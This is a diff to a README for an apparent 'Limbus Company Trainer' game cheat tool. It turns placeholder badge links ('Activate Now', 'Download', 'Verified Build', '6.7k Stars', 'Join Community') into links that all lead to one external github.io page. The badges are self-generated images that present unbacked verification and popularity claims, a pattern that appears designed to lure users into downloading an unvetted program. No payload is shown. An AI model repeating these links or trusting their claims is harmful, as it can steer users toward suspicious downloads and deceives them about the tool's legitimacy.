@@ -22,10 +22,10 @@ This trainer is a **single-player optimization tool** designed to streamline far
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 6.7k Stars](https://img.shields.io/badge/GitHub-6.7k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://limbus-company-trainers.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://limbus-company-trainers.github.io/.github/)
+[![⭐️ 6.7k Stars](https://img.shields.io/badge/GitHub-6.7k_Stars-green?logo=github\&style=for-the-badge)](https://limbus-company-trainers.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://limbus-company-trainers.github.io/.github/)
 
 ---
 
@@ -152,8 +152,8 @@ A: Yes, simply disable the trainer or press the reset option.
 
 The **Limbus Company Trainer** empowers players with **combat assists, resource boosts, and stamina control** for smoother progression. Whether you’re farming shards, tackling bosses, or breezing through story content, it lets you experience the game exactly how you want.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://limbus-company-trainers.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://limbus-company-trainers.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://limbus-company-trainers.github.io/.github/)
 
 ---
